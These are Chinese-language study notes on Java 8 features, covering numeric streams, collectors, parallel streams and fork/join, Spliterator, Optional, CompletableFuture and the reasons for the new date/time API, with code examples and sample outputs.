数值流 Numeric Streams
为了避免装箱带来的复杂性


映射到数值流: mapToInt、mapToDouble 和 mapToLong
转换回对象流

IntStream intStream = menu.stream().mapToInt(Dish::getCalories);Stream&lt;Integer&gt; stream = intStream.boxed();

默认值 OptionalInt 、 OptionalDouble 和 OptionalLong
数值范围 IntStream.rangeClosed(1, 100)



构建流 Building streams

由值创建流：

Stream&lt;String&gt; stream = Stream.of("Java 8 ", "Lambdas ", "In ", "Action";stream.map(String::toUpperCase).forEach(System.out::println);//空流Stream&lt;String&gt; emptyStream = Stream.empty();
2. 由数组创建流

  int[] numbers = {2, 3, 5, 7, 11, 13};int sum = Arrays.stream(numbers).sum();
3. 由文件生成流

  long uniqueWords = Files.lines(Paths.get("data.txt"), Charset.defaultCharset()).flatMap(line -&gt; Arrays.stream(line.split(" "))).distinct().count();

由函数生成流:创建无限流

   // iterateStream.iterate(0, n -&gt; n + 2).limit(10).forEach(System.out::println);// generateStream.generate(Math::random).limit(5).forEach(System.out::println);


用stream收集数据
常用的收集器
Collectors.reducing：广义的归约汇总
需要三个参数：

归约操作的起始值
获取或操作对象的属性数值(转换函数)
BinaryOperator，如加法

举例：
int totalCalories = menu.stream().collect(reducing(    0,                      // 归约操作的起始值    Dish::getCalories,      // 获取或操作对象的属性数值(转换函数)    (i, j) -&gt; i + j));      // BinaryOperator，如加法
Collectors.groupingBy ：分组

一级分组

Map&lt;Dish.Type, List&lt;Dish&gt;&gt; dishesByType = menu.stream().collect(groupingBy(Dish::getType));// 自定义分组public enum CaloricLevel { DIET, NORMAL, FAT }Map&lt;CaloricLevel, List&lt;Dish&gt;&gt; dishesByCaloricLevel = menu.stream()                .collect(groupingBy(dish -&gt; {                    if (dish.getCalories() &lt;= 400)                        return CaloricLevel.DIET;                    else if (dish.getCalories() &lt;= 700)                        return CaloricLevel.NORMAL;                    else                        return CaloricLevel.FAT;                }));

多级分组

menu.stream().collect(groupingBy(Dish::getType,            groupingBy((Dish dish) -&gt; {                if (dish.getCalories() &lt;= 400)                     return CaloricLevel.DIET;                else if (dish.getCalories() &lt;= 700)                     return CaloricLevel.NORMAL;                else                     return CaloricLevel.FAT;            } )        );

与 groupingBy 联合使用的其他收集器
有时候在groupBy的时候，我们还想做一下其他操作，比如设定返回类型，或者只取对象中的某个属性。

// summingIntMap&lt;Dish.Type, Integer&gt; totalCaloriesByType = menu.stream().collect(groupingBy(Dish::getType, summingInt(Dish::getCalories)));// mappingmenu.stream().collect(groupingBy(Dish::getType, mapping(dish -&gt; {        if (dish.getCalories() &lt;= 400)            return CaloricLevel.DIET;        else if (dish.getCalories() &lt;= 700)            return CaloricLevel.NORMAL;        else            return CaloricLevel.FAT;    }, toSet())));//按子组收集数据Map&lt;Dish.Type, Long&gt; typesCount = menu.stream().collect(    groupingBy(Dish::getType, counting()));//Collectors.collectingAndThen： 把收集器返回的结果转换为另一种类型Map&lt;Dish.Type, Dish&gt; mostCaloricByType = menu.stream().collect(groupingBy(Dish::getType,     collectingAndThen(maxBy(comparingInt(Dish::getCalories)), Optional::get)));
Collectors.counting()
Collectors.maxBy
Collectors.minBy
Collectors.summingInt，Collectors.summingLong，Collectors.summingDouble
Collectors.averagingInt，Collectors.averagingLong，Collectors.averagingDouble
Collectors.summarizingInt
Collectors.joining
Collectors.partitioningBy 分区
好处：保留了分区函数返回 true 或 false 的两套流元素列表。
与groupby的区别：需要一个谓词（返回一个布尔值的函数）
Map&lt;Boolean, List&lt;Dish&gt;&gt; partitionedMenu = menu.stream().collect(partitioningBy(Dish::isVegetarian));//二级分区menu.stream().collect(partitioningBy(Dish::isVegetarian, partitioningBy (d -&gt; d.getCalories() &gt; 500)));//联合其他收集器menu.stream().collect(partitioningBy(Dish::isVegetarian, counting()));
Collector 接口
基本定义：
public interface Collector&lt;T, A, R&gt; {    Supplier&lt;A&gt; supplier();    BiConsumer&lt;A, T&gt; accumulator();    Function&lt;A, R&gt; finisher();    BinaryOperator&lt;A&gt; combiner();    Set&lt;Characteristics&gt; characteristics();}

T 是流中要收集的项目的泛型
A 是累加器的类型,累加器是在收集过程中用于累积部分结果的对象。
R 是收集操作得到的对象(通常但并不一定是集合)的类型。

方法分析：

建立新的结果容器: supplier 方法
将元素添加到结果容器: accumulator 方法
对结果容器应用最终转换: finisher 方法
合并两个结果容器: combiner 方法（并行归约）
characteristics 方法：返回一个不可变的 Characteristics 集合

UNORDERED：归约结果不受流中项目的遍历和累积顺序的影响
CONCURRENT：accumulator函数可以从多个线程同时调用,且该收集器可以并行归约流。如果收集器没有标为UNORDERED,那它仅在用于无序数据源时才可以并行归约
IDENTITY_FINISH：表明完成器方法返回的函数是一个恒等函数



自定义收集器
必要时，可以根据自己需求实现收集器， 来避免一些不必要的操作（如装箱拆箱），这样子可以获取更好的性能。
测试用例如下：
@Test   public void testOwnCollector() {       class ToListCollector&lt;T&gt; implements Collector&lt;T, List&lt;T&gt;, List&lt;T&gt;&gt; {           @Override           public Supplier&lt;List&lt;T&gt;&gt; supplier() {               log("supplier");               return ArrayList::new;           }           @Override           public BiConsumer&lt;List&lt;T&gt;, T&gt; accumulator() {               log("accumulator");               return List::add;           }           @Override           public BinaryOperator&lt;List&lt;T&gt;&gt; combiner() {               log("combiner");               return (l1, l2) -&gt; {                   l1.addAll(l2);                   return l1;               };           }           @Override           public Function&lt;List&lt;T&gt;, List&lt;T&gt;&gt; finisher() {               return Function.identity();           }           @Override           public Set&lt;Characteristics&gt; characteristics() {               log("characteristics");               return Collections.unmodifiableSet(EnumSet.of(Characteristics.IDENTITY_FINISH, Characteristics.CONCURRENT));           }           private void log(final String log) {               System.out.println(Thread.currentThread().getName() + "-" + log);           }       }       Collector&lt;String, List&lt;String&gt;, List&lt;String&gt;&gt; collector = new ToListCollector&lt;&gt;();       String[] arr = new String[]{"e1", "2r", "c", "s"};       Optional.of(Arrays.stream(arr).filter(e -&gt; e.matches("[a-z]")).collect(collector))               .ifPresent(e -&gt; {                   System.out.println(e.getClass());                   System.out.println(JSONObject.toJSONString(e));               });   }
并行数据处理与性能
1. 并行流处理数据
java 8 中提供了现成的并行处理流，即parallelStream。
并行流与顺序流的转换
对顺序流调用parallel方法，对并行流调用sequential方法。在合适的时候顺序流与并行流相互转换，可以提高效率。
stream.parallel()    .filter(...)    .sequential()    .map(...)    .parallel()    .reduce();
注意点：

保证在内核中并行执行工作的时间比在内核之间传输数据的时间长。
避免改变了某些共享状态

配置并行流使用的线程池
并行流内部使用了默认的 ForkJoinPool， 它默认的线程数量就是你的处理器数量, 这个值是由Runtime.getRuntime().availableProcessors() 得到的。
可以通过系统属性java.util.concurrent.ForkJoinPool.common.parallelism 来改变线程池大小：
System.setProperty("java.util.concurrent.ForkJoinPool.common.parallelism","12");
如何高效使用：

测量
留意装箱
依赖于元素顺序的操作，本身在并行流上的性能就比顺序流差
流的操作流水线的总计算成本
数据少
数据结构是否易于分解
流自身的特点，以及流水线中的中间操作修改流的方式，都可能会改变分解过程的性能
终端操作中合并步骤的代价是大是小

2. 分支/合并框架(The fork/join framework)
目的
以递归方式将可以并行的任务拆分成更小的任务，然后将每个子任务的结果合并起来生成整体结果。（先拆，并行处理，合并结果）
定义
RecursiveTask是ExecutorService接口的一个实现，它把子任务分配给线程池（称为ForkJoinPool）中的工作线程。
使用
实现compute()方法，提交至ForkJoinPool.invoke
实际例子：
import java.util.concurrent.ForkJoinPool;import java.util.concurrent.ForkJoinTask;import java.util.concurrent.RecursiveTask;import java.util.stream.LongStream;public class ForkJoinSumCalculator extends RecursiveTask&lt;Long&gt; {    // 拆分任务的标准大小    public static final long THRESHOLD = 10_000;    private final long[] numbers;    private final int start;    private final int end;    public ForkJoinSumCalculator(long[] numbers) {        this(numbers, 0, numbers.length);    }    private ForkJoinSumCalculator(long[] numbers, int start, int end) {        this.numbers = numbers;        this.start = start;        this.end = end;    }    // 实现compute方法    @Override    protected Long compute() {        int length = end - start; // 获取当前剩余任务的大小        if (length &lt;= THRESHOLD) {            return computeSequentially();        }        // 创建另外一个子任务 leftTask        ForkJoinSumCalculator leftTask = new ForkJoinSumCalculator(numbers, start, start + length/2);        // 异步执行 leftTask        leftTask.fork();        // 创建剩余一半任务的子任务 rightTask        ForkJoinSumCalculator rightTask = new ForkJoinSumCalculator(numbers, start + length/2, end);        // 递归调用获取结果        Long rightResult = rightTask.compute();        // 获取 leftTask 结果        Long leftResult = leftTask.join();        return leftResult + rightResult;    }    private long computeSequentially() {        long sum = 0;        for (int i = start; i &lt; end; i++) {            sum += numbers[i];        }        return sum;    }    // 如何调用fork/join框架    public static long forkJoinSum(long n) {        long[] numbers = LongStream.rangeClosed(1, n).toArray();        ForkJoinTask&lt;Long&gt; task = new ForkJoinSumCalculator(numbers);        return new ForkJoinPool().invoke(task);    }}
好的做法

join方法会阻塞，所以先确保两个子任务全部启动，再调用join
RecursiveTask内部不应该调用ForkJoinPool.invoke，应该直接调用compute、fork，只有顺序代码才应该用 invoke 来启动并行计算
一边子任务fork，一边子任务compute，避免在线程池中多分配一个任务造成的开销
调试使用分支/合并框架的并行计算可能有点棘手, 调用compute的线程并不是概念上的调用方(即调用fork的那个).
不应理所当然地认为在多核处理器上使用分支/合并框架就比顺序计算快。

工作窃取（work stealing）
目的：为解决因为每个子任务所花的时间可能天差地别而造成的效率低下。 过程：线程把任务保存到一个双向链式队列，当一个线程的队列空了，它就随机从其他线程的队列尾部“偷”一个任务执行
思考
问：都是拆分任务，并行执行，为什么不使用线程池，如ThreadPoolExecutor呢？
答：Thread pool 默认期望它们所有执行的任务都是不相关的，可以尽可能的并行执行。
而fork join框架解决的问题，是一个全局问题，所有子任务拆分运行后的结果，是要合并起来的。另外，fork-join pool另一个特点work stealing，如果用ThreadPoolExecutor实现是比较麻烦的
3. Spliterator分割流
简单了解
描述：一种自动机制来拆分流。新的接口“可分迭代器”（splitable iterator）
public interface Spliterator&lt;T&gt; {    boolean tryAdvance(Consumer&lt;? super T&gt; action);    Spliterator&lt;T&gt; trySplit();    long estimateSize();    int characteristics();}
拆分过程
递归过程。框架不断对Spliterator调用trySplit直到它返回null,表明它处理的数据结构不能再分割。
Spliterator 的特性



特性
含义




ORDERED
元素有既定的顺序(例如 List ),因此 Spliterator 在遍历和划分时也会遵循这一顺序


DISTINCT
对于任意一对遍历过的元素 x 和 y , x.equals(y) 返回 false


SORTED
遍历的元素按照一个预定义的顺序排序


SIZED
该 Spliterator 由一个已知大小的源建立(例如 Set ),因此 estimatedSize() 返回的是准确值


NONNULL
保证遍历的元素不会为 null


IMMUTABL
Spliterator 的数据源不能修改。这意味着在遍历时不能添加、删除或修改任何元素E


CONCURRENT
该 Spliterator 的数据源可以被其他线程同时修改而无需同步


SUBSIZED
该 Spliterator 和所有从它拆分出来的 Spliterator 都是 SIZED



各个函数及作用



函数名
作用




tryAdvance
执行一个操作给传入的元素，并且返回一个boolean，来表示是否有剩余元素需要处理


trySplit
最重要的函数，如果数据可以继续分割，返回一个Spliterator，否则返回null


estimateSize
返回一个对剩余元素数量的估值


characteristics
设置Spliterator的某些特性，参考上表。



默认方法
public interface Sized {    int size();    default boolean isEmpty() {        return size() == 0;    }}
这样任何一个实现了Sized接口的类都会自动继承isEmpty的实现。因此，向提供了默认实 现的接口添加方法就不是源码兼容的。
☀️ 关于继承的一些错误观点
继承不应该成为你一谈到代码复用就试图倚靠的万精油。比如，从一个拥有100个方法及 字段的类进行
继承就不是个好主意，因为这其实会引入不必要的复杂性。你完全可以使用代理 有效地规避这种窘境，即创建一个方法通过该类的成员变量直接调用该类的方法。这就是为什 么有的时候我们发现有些类被刻意地声明为final类型：声明为final的类不能被其他的类继 承，避免发生这样的反模式，防止核心代码的功能被污染。注意，有的时候声明为final的类 都会有其不同的原因，比如，String类被声明为final，因为我们不希望有人对这样的核心 功能产生干扰。
这种思想同样也适用于使用默认方法的接口。通过精简的接口，你能获得最有效的组合， 因为你可以只选择你需要的实现。
多来源继承调用默认方法原则
(1) 类中的方法优先级最高。类或父类中声明的方法的优先级高于任何声明为默认方法的优 先级。
(2) 如果无法依据第一条进行判断，那么子接口的优先级更高：函数签名相同时，优先选择 拥有最具体实现的默认方法的接口，即如果B继承了A，那么B就比A更加具体。
(3) 最后，如果还是无法判断，继承了多个接口的类必须通过显式覆盖和调用期望的方法，显式地选择使用哪一个默认方法的实现。
用Optional取代null
创建 Optional 对象

声明一个空的Optional

Optional&lt;Car&gt; optCar = Optional.empty();

依据一个非空值创建Optional

Optional&lt;Car&gt; optCar = Optional.of(car);

可接受null的Optional
最后，使用静态工厂方法Optional.ofNullable，你可以创建一个允许null值的Optional 对象：

Optional&lt;Car&gt; optCar = Optional.ofNullable(car);
使用 map 从 Optional 对象中提取和转换值
Optional&lt;Insurance&gt; optInsurance = Optional.ofNullable(insurance);Optional&lt;String&gt; name = optInsurance.map(Insurance::getName);
使用 flatMap 链接 Optional 对象
原因
使用 map 从 Optional 对象中提取和转换值，遭遇嵌套式的Optional结构
Optional&lt;Person&gt; optPerson = Optional.of(person); Optional&lt;String&gt; name = optPerson.map(Person::getCar) .map(Car::getInsurance) .map(Insurance::getName);
处理
public String getCarInsuranceName(Optional&lt;Person&gt; person) { 	return person.flatMap(Person::getCar)                          .flatMap(Car::getInsurance)                          .map(Insurance::getName)                          .orElse("Unknown"); }
Optional类并未实现 Serializable接口
默认行为及解引用 Optional 对象



方法
描述




empty
返回一个空的 Optional 实例


filter
如果值存在并且满足提供的谓词，就返回包含该值的 Optional 对象；否则返回一个空的 Optional 对象


flatMap
如果值存在，就对该值执行提供的 mapping 函数调用，返回一个 Optional 类型的值，否则就返 回一个空的 Optional对象


get
如果该值存在，将该值用 Optional 封装返回，否则抛出一个 NoSuchElementException 异常


ifPresent
如果值存在，就执行使用该值的方法调用，否则什么也不做


isPresent
如果值存在就返回 true，否则返回 false


map
如果值存在，就对该值执行提供的 mapping 函数调用


of
将指定值用 Optional 封装之后返回，如果该值为 null，则抛出一个 NullPointerException 异常


ofNullable
将指定值用 Optional 封装之后返回，如果该值为 null，则返回一个空的 Optional 对象


orElse
如果有值则将其返回，否则返回一个默认值


orElseGet
如果有值则将其返回，否则返回一个由指定的 Supplier 接口生成的值


orElseThrow
如果有值则将其返回，否则抛出一个由指定的 Supplier 接口生成的异常



CompletableFuture 组合式异步编程
Future 接口异步
Future接口在Java 5中被引入，设计初衷是对将来某个时刻会发生的结果进行建模。它建模 了一种异步计算，返回一个执行运算结果的引用，当运算结束后，这个引用被返回给调用方。
模拟1

使用Future以异步的方式执行一个耗时的操作

import org.junit.Test;import java.util.concurrent.atomic.AtomicBoolean;import java.util.concurrent.atomic.AtomicReference;public class FutureInAction {    private interface Future&lt;T&gt; {        T get();        boolean isDone();    }    private interface Callable&lt;T&gt; {        T action();    }    private static &lt;T&gt; Future&lt;T&gt; invoke(Callable&lt;T&gt; callable) {        // 异步返回值        AtomicReference&lt;T&gt; result = new AtomicReference&lt;&gt;();        // 异步处理完成        AtomicBoolean finished = new AtomicBoolean(false);        Thread thread = new Thread(() -&gt; {            result.set(callable.action());            finished.set(true);        });        thread.start();        Future&lt;T&gt; future = new Future&lt;T&gt;() {            @Override            public T get() {                return result.get();            }            @Override            public boolean isDone() {                return finished.get();            }        };        return future;    }    @Test    public void testFuture() {        Future&lt;String&gt; result = invoke(() -&gt; {            try {                Thread.sleep(10);                return "I am finished.";            } catch (InterruptedException e) {                return "Error";            }        });        System.out.println(result.get());        while (!result.isDone()) {            try {                Thread.sleep(1);                System.out.println("waitting...");            } catch (InterruptedException e) {                e.printStackTrace();            }        }        System.out.println(result.get());        System.out.println(result.isDone());    }}
输出
nullwaitting...waitting...waitting...waitting...waitting...waitting...I am finished.true
模拟2
import org.junit.Test;import java.util.concurrent.*;import java.util.concurrent.atomic.LongAccumulator;public class FutureInAction2 {    @Test    public void testExecutorService() {        ExecutorService executorService = Executors.newSingleThreadExecutor();        LongAccumulator longAccumulator = new LongAccumulator(Long::sum, 0);        Future&lt;String&gt; result = executorService.submit(() -&gt; {            System.out.println(Thread.currentThread().getName());            int begin = 1;            while (begin &lt; 10) {                System.out.println("+");                Thread.sleep(1);                longAccumulator.accumulate(begin++);            }            return "I am finished.";        });//        // 阻塞等待执行结果//        result.get();//        System.out.println("result..." + longAccumulator.get());//        //最多等待10秒, 超时未执行完成，报错//        try {//            result.get(10, TimeUnit.SECONDS);//            System.out.println("result..." + longAccumulator.get());//        } catch (Exception e) {//            // java.util.concurrent.TimeoutException//            e.printStackTrace();//        }        // 阻塞等待执行结果        if (!result.isDone()) {            System.out.print("running");            while (!result.isDone()) {                System.out.print(".");            }            System.out.println();            System.out.println("result..." + longAccumulator.get());        }        executorService.shutdown();    }}
输出
running.................................................................................................pool-1-thread-1...................................................+...................................................................................................+................................................................................................................................................................................................................................................+..................................................................................................................................................................+.........................................................................................................+..............................................................................................................................................................................................................+..........................................................................................................................................................+.......................................................................................................................................................+...............................+....................................................................................................................................................................................................result...45
模拟3
将阻塞等待完成后调用程序
import java.util.concurrent.atomic.AtomicBoolean;import java.util.concurrent.atomic.AtomicReference;public class FutureInAction3 {    private interface Callable&lt;T&gt; {        T action();    }    private interface Completable&lt;T&gt; {        void complete(T t);        void exception(Throwable throwable);    }    private interface Future&lt;T&gt; {        T get();        boolean isDone();        void setCompletable(Completable&lt;T&gt; completable);        Completable&lt;T&gt; getCompletable();    }    public static &lt;T&gt; Future&lt;T&gt; invoke(Callable&lt;T&gt; callable) {        AtomicReference&lt;T&gt; atomicReference = new AtomicReference&lt;&gt;();        AtomicBoolean atomicBoolean = new AtomicBoolean(false);        Future&lt;T&gt; future = new Future&lt;T&gt;() {            private Completable&lt;T&gt; completable;            @Override            public T get() {                return atomicReference.get();            }            @Override            public boolean isDone() {                return atomicBoolean.get();            }            @Override            public void setCompletable(Completable&lt;T&gt; completable) {                this.completable = completable;            }            @Override            public Completable&lt;T&gt; getCompletable() {                return completable;            }        };        Thread thread = new Thread(() -&gt; {            try {                T t = callable.action();                atomicReference.set(t);                atomicBoolean.set(true);                if (future.getCompletable() != null) {                    future.getCompletable().complete(t);                }            } catch (Throwable e) {                if (future.getCompletable() != null) {                    future.getCompletable().exception(e);                }            }        });        thread.start();        return future;    }    public static void main(String[] args) {        Future&lt;String&gt; result = invoke(() -&gt; {            try {                Thread.sleep(10000);                return "I am finished.";            } catch (InterruptedException e) {                e.printStackTrace();                return "Error.";            }        });        result.setCompletable(new Completable&lt;String&gt;() {            @Override            public void complete(String s) {                System.out.println("complete..." + s);            }            @Override            public void exception(Throwable cause) {                System.out.println("exception error");                cause.printStackTrace();            }        });        System.out.println("end....");    }}
输出
end....complete...I am finished.
CompletableFuture 构建异步应用
模拟异步操作内容
import java.util.Random;public class CompletableFutureSupport {    static final Random random = new Random(System.currentTimeMillis());    static double getActionBody() {        try {            System.out.println(Thread.currentThread().getName() + "：get（begin）");            Thread.sleep(10000L);            double v = random.nextDouble();            System.out.println(Thread.currentThread().getName() + "：get（done）：" + v);            return v;        } catch (InterruptedException e) {            throw new RuntimeException(e);        }    }}
模拟1
CompletableFuture阻塞等待
import java.util.Optional;import java.util.concurrent.CompletableFuture;public class CompletableFutureInAction1 {    public static void main(String[] args) {        CompletableFuture&lt;Double&gt; completableFuture = new CompletableFuture&lt;&gt;();        new Thread(() -&gt; {            System.out.println("action:-&gt;" + Thread.currentThread().getName());            double v = CompletableFutureSupport.getActionBody();            completableFuture.complete(v);        }).start();        System.out.println("main.....1");        completableFuture.whenComplete((v, t) -&gt; {            System.out.println("complete.....2");            Optional.ofNullable(v).ifPresent(System.out::println);            Optional.ofNullable(t).ifPresent(tt -&gt; tt.printStackTrace());        });    }}
输出
main.....1action:-&gt;Thread-0Thread-0：get（begin）Thread-0：get（done）：0.30457757812323727complete.....20.30457757812323727
模拟2
CompletableFuture.supplyAsync 异步请求
/**     * main 线程不会等待whenComplete。     * main结束的时候，completableFuture的Supplier 未执行完成，线程也会随main的结束而结束     *     * @throws ExecutionException     * @throws InterruptedException     */    public static void main(String[] args) {        CompletableFuture&lt;Double&gt; completableFuture = CompletableFuture.supplyAsync(CompletableFutureSupport::getActionBody);        System.out.println(Thread.currentThread().getName() + "..........................1");        completableFuture.whenComplete((v, t) -&gt; {            System.out.println(Thread.currentThread().getName() + "：complete_action（begin）");            Optional.ofNullable(v).ifPresent(System.out::println);            Optional.ofNullable(t).ifPresent(tt -&gt; tt.printStackTrace());            System.out.println(Thread.currentThread().getName() + "：complete_action（end）");        });    }
输出
main..........................1ForkJoinPool.commonPool-worker-9：get（begin）
模拟3
改写模拟2，不使用阻塞的方式
public static void main(String[] args) {        ExecutorService executorService = Executors.newFixedThreadPool(2, (r) -&gt; {            Thread thread = new Thread(r);            // 不以守护进程的方式运行            thread.setDaemon(false);            return thread;        });        CompletableFuture&lt;Double&gt; completableFuture = CompletableFuture.supplyAsync(CompletableFutureSupport::getActionBody, executorService);        // main        System.out.println(Thread.currentThread().getName() + "..........................1");        completableFuture.whenComplete((v, t) -&gt; {            System.out.println(Thread.currentThread().getName() + "：complete_action（begin）");            Optional.ofNullable(v).ifPresent(System.out::println);            Optional.ofNullable(t).ifPresent(tt -&gt; tt.printStackTrace());            System.out.println(Thread.currentThread().getName() + "：complete_action（end）");        });        // main        System.out.println(Thread.currentThread().getName() + "..........................2");        // 需要显示关闭线程        // 执行先前提交的任务后，启动有序关闭。如果已经关闭，调用没有额外的影响        executorService.shutdown();        // main        System.out.println(Thread.currentThread().getName() + "..........................3");    }
输出
main..........................1Thread-0：get（begin）main..........................2main..........................3Thread-0：get（done）：0.9293436815770424Thread-0：complete_action（begin）0.9293436815770424Thread-0：complete_action（end）
CompletableFuture常用API



方法
API




supplyAsyn
CompletableFuturesupplyAsync(Suppliersupplier);CompletableFuturesupplyAsync(Suppliersupplier,Executorexecutor);


thenApply
CompletableFuturethenApply(Function&lt;?superT,?extendsU&gt;fn);


handle
CompletableFuturehandle(BiFunction&lt;?superT,Throwable,?extendsU&gt;fn)


thenRun
CompletableFuturethenRun(Runnableaction)


thenAccept
CompletableFuturethenAccept(Consumer&lt;?superT&gt;action)


thenCompose
CompletableFuturethenCompose(Function&lt;?superT,?extendsCompletionStage&gt;fn)继续执行下一个CompletableFuture


thenCombine
CompletableFuturethenCombine(CompletionStage&lt;?extendsU&gt;other,BiFunction&lt;?superT,?superU,?extendsV&gt;fn)两个CompletableFuture的返回结果经过BiFunction处理，进入后续操作。


thenAcceptBoth
CompletionStagethenAcceptBoth(CompletionStage&lt;?extendsU&gt;other,BiConsumer&lt;?superT,?superU&gt;action)两个CompletableFuture的返回结果经过BiConsumer处理，进入后续操作。


runAfterBoth
CompletableFuturerunAfterBoth(CompletionStage&lt;?&gt;other,Runnableaction)两个CompletableFuture的返回结果经过Runnable处理，进入后续操作。


applyToEither
CompletionStageapplyToEither(CompletionStage&lt;?extendsT&gt;other,Function&lt;?superT,U&gt;fn)两个CompletionStage任意一个执行完成即可执行其Function。


acceptEither
CompletableFutureacceptEither(CompletionStage&lt;?extendsT&gt;other,Consumer&lt;?superT&gt;action)两个CompletionStage任意一个执行完成即可执行其Consumer


runAfterEither
CompletableFuturerunAfterEither(CompletionStage&lt;?&gt;other,Runnableaction)两个CompletableFuture任意一个执行完成即可执行其Runnable


allOf
publicstaticCompletableFutureallOf(CompletableFuture&lt;?&gt;…cfs)等待所有CompletableFuture执行完成之后，执行后续操作。


anyOf
publicstaticCompletableFutureanyOf(CompletableFuture&lt;?&gt;…cfs)等待任意一个CompletableFuture执行完成之后，执行后续操作



supplyAsyn
API：CompletableFuture&lt;U&gt; supplyAsync(Supplier&lt;U&gt; supplier);举例：CompletableFuture.supplyAsync(() -&gt; 1);API：CompletableFuture&lt;U&gt; supplyAsync(Supplier&lt;U&gt; supplier,  Executor executor);举例：ExecutorService executor = Executors.newFixedThreadPool(2, (r) -&gt; {	Thread thread = new Thread(r); 	thread.setDaemon(false);	return thread;});CompletableFuture.supplyAsync(() -&gt; 1, executor);
thenApply
API:CompletableFuture&lt;U&gt; thenApply(Function&lt;? super T,? extends U&gt; fn);举例：CompletableFuture.supplyAsync(() -&gt; 1)        .thenApply(v -&gt; Integer.sum(v, 10))        .whenComplete((v, t) -&gt; System.out.println(v));
handle
可以对抛出的异常进行处理
API:CompletableFuture&lt;U&gt; handle(BiFunction&lt;? super T, Throwable, ? extends U&gt; fn)举例：CompletableFuture.supplyAsync(() -&gt; 1)        .handle((v, t) -&gt; Integer.sum(v, 10))        .whenComplete((v, t) -&gt; System.out.println(v));
thenRun
执行完成之后的其他操作。无入参。
API:CompletableFuture&lt;Void&gt; thenRun(Runnable action)举例：CompletableFuture.supplyAsync(() -&gt; 1)        .whenComplete((v, t) -&gt; System.out.println(v))        .thenRun(() -&gt; System.out.println());
thenAccept
返回结果V的后续消费
API:CompletableFuture&lt;Void&gt; thenAccept(Consumer&lt;? super T&gt; action)举例：CompletableFuture.supplyAsync(() -&gt; 1)        .whenComplete((v, t) -&gt; System.out.println(v))        .thenAccept((v) -&gt; System.out.println(v));
thenCompose
继续执行下一个CompletableFuture
API:CompletableFuture&lt;U&gt; thenCompose(Function&lt;? super T, ? extends CompletionStage&lt;U&gt;&gt; fn)其中：Function&lt;? super T, ? extends CompletionStage&lt;U&gt;&gt; fn是另外一个CompletableFuture。举例：CompletableFuture.supplyAsync(() -&gt; 1)        .thenCompose(v -&gt; CompletableFuture.supplyAsync(() -&gt; v + 10))        .whenComplete((v, t) -&gt; System.out.println(v));
thenCombine
两个CompletableFuture的返回结果经过BiFunction处理，进入后续操作。
API:CompletableFuture&lt;V&gt; thenCombine(CompletionStage&lt;? extends U&gt; other,        BiFunction&lt;? super T,? super U,? extends V&gt; fn) 举例：CompletableFuture.supplyAsync(() -&gt; 1)        .thenCombine(CompletableFuture.supplyAsync(() -&gt; 2), (v1, v2) -&gt; v1 + v2)        .whenComplete((v, t) -&gt; System.out.println(v));
thenAcceptBoth
两个CompletableFuture的返回结果经过BiConsumer处理，进入后续消费。
API:CompletionStage&lt;Void&gt; thenAcceptBoth(CompletionStage&lt;? extends U&gt; other,        BiConsumer&lt;? super T, ? super U&gt; action) 举例：CompletableFuture.supplyAsync(() -&gt; 1)        .thenAcceptBoth(CompletableFuture.supplyAsync(() -&gt; 2), (v1, v2) -&gt; {            System.out.println(v1);            System.out.println(v2);        }).whenComplete((v, t) -&gt; System.out.println(v));输出：12null
runAfterBoth
API:CompletableFuture&lt;Void&gt; runAfterBoth(CompletionStage&lt;?&gt; other, Runnable action)
applyToEither
两个CompletionStage 任意一个执行完成即可执行其Function。
API:CompletionStage&lt;U&gt; applyToEither(CompletionStage&lt;? extends T&gt; other,         Function&lt;? super T, U&gt; fn)举例：CompletableFuture.supplyAsync(() -&gt; 1)        .applyToEither(CompletableFuture.supplyAsync(() -&gt; 2), v -&gt; v + 10)        .whenComplete((v, t) -&gt; System.out.println(v));输出：11
acceptEither
两个CompletionStage 任意一个执行完成即可执行其Consumer
API:CompletableFuture&lt;Void&gt; acceptEither(        CompletionStage&lt;? extends T&gt; other, Consumer&lt;? super T&gt; action)举例：CompletableFuture.supplyAsync(() -&gt; 1)        .acceptEither(CompletableFuture.supplyAsync(() -&gt; 2), v -&gt; System.out.println(v))        .whenComplete((v, t) -&gt; System.out.println(v));输出：1null
runAfterEither
两个CompletionStage 任意一个执行完成即可执行其Runnable。
CompletableFuture&lt;Void&gt; runAfterEither(CompletionStage&lt;?&gt; other,                                                  Runnable action)
allOf
等待所有CompletableFuture执行完成之后，执行后续的操作
API:public static CompletableFuture&lt;Void&gt; allOf(CompletableFuture&lt;?&gt;... cfs)举例：List&lt;CompletableFuture&lt;Double&gt;&gt; collect = Arrays.asList(1, 2, 3, 4)    .stream()    .map(i -&gt; CompletableFuture.supplyAsync(() -&gt; 1)    .collect(toList());CompletableFuture.allOf(collect.toArray(new CompletableFuture[collect.size()]))    .thenRun(() -&gt; System.out.println("done"));
anyOf
等待任意一个CompletableFuture执行完成之后，执行后续的操作
API：public static CompletableFuture&lt;Object&gt; anyOf(CompletableFuture&lt;?&gt;... cfs)举例：List&lt;CompletableFuture&lt;Double&gt;&gt; collect = Arrays.asList(1, 2, 3, 4)    .stream()    .map(i -&gt; CompletableFuture.supplyAsync(() -&gt; 1)    .collect(toList());CompletableFuture.anyOf(collect.toArray(new CompletableFuture[collect.size()]))    .thenRun(() -&gt; System.out.println("done"));
新的日期和时间API
重新设计原因

java.util.Date 不够直观。
Date date = new Date(114, 2, 18);
它的打印输出效果为： Tue Mar 18 00:00:00 CET 2014
线程不安全

public static void main(String[] args) throws ParseException, InterruptedException {        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd");        for (int i = 0; i &lt; 30; i++) {            new Thread(() -&gt; {                for (int x = 0; x &lt; 100; x++) {                    Date parseDate = null;                    try {                        parseDate = sdf.parse("20160505");                    } catch (ParseException e) {                        e.printStackTrace();                    }                    System.out.println(parseDate);                }            }).start();        }    }输出Thu May 05 00:00:00 CST 2016Thu May 05 00:00:00 CST 2016...Exception in thread "Thread-19" java.lang.NumberFormatException: For input string: ""	at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)	at java.base/java.lang.Long.parseLong(Long.java:702)	at java.base/java.lang.Long.parseLong(Long.java:817)	at java.base/java.text.DigitList.getLong(DigitList.java:195)	at java.base/java.text.DecimalFormat.parse(DecimalFormat.java:2093)	at java.base/java.text.SimpleDateFormat.subParse(SimpleDateFormat.java:1913)	at java.base/java.text.SimpleDateFormat.parse(SimpleDateFormat.java:1529)	at java.base/java.text.DateFormat.parse(DateFormat.java:386)	at com.hots.TimeTest.lambda$main$0(TimeTest.java:15)	at java.base/java.lang.Thread.run(Thread.java:844)Exception in thread "Thread-17" 